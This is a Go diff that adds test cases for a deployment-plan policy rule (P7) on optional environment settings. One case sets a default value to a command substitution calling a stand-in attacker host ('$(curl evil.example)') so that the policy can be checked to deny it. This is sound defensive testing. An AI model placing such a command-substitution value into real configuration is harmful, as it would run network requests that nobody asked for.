@@ -263,6 +263,21 @@ var planCases = []planCase{
 		plan.Services[1].Volumes = append(plan.Services[1].Volumes, ir.Volume{Name: "other", ContainerPath: "/var/lib/postgresql/data/"})
 	}},
 
+	{name: "P7 optional setting with an invalid name denied", rule: "P7", want: policy.Deny, blocked: true,
+		mutate: func(plan *ir.IR) {
+			plan.OptionalEnv = []ir.OptionalSetting{{Service: plan.Services[0].Name, Key: "BAD-NAME"}}
+		}},
+	{name: "P7 optional setting for an unknown service denied", rule: "P7", want: policy.Deny, blocked: true,
+		mutate: func(plan *ir.IR) { plan.OptionalEnv = []ir.OptionalSetting{{Service: "ghost", Key: "GHOST_LEVEL"}} }},
+	{name: "P7 optional default with a command denied", rule: "P7", want: policy.Deny, blocked: true,
+		mutate: func(plan *ir.IR) {
+			plan.OptionalEnv = []ir.OptionalSetting{{Service: plan.Services[0].Name, Key: "APP_HOOK", Default: "$(curl evil.example)"}}
+		}},
+	{name: "P7 documented optional setting passes", rule: "P7", want: policy.OK,
+		mutate: func(plan *ir.IR) {
+			plan.OptionalEnv = []ir.OptionalSetting{{Service: plan.Services[0].Name, Key: "APP_LOG_LEVEL", Default: "${OTHER:-info}"}}
+		}},
+
 	{name: "P9 host network blocks until granted", rule: "P9", want: policy.Need, blocked: true, scenario: "host-network-need",
 		mutate: func(plan *ir.IR) {
 			plan.Needs = []ir.Need{{Capability: ir.NeedHostNetwork, Service: "miniflux", Reason: "mDNS discovery"}}
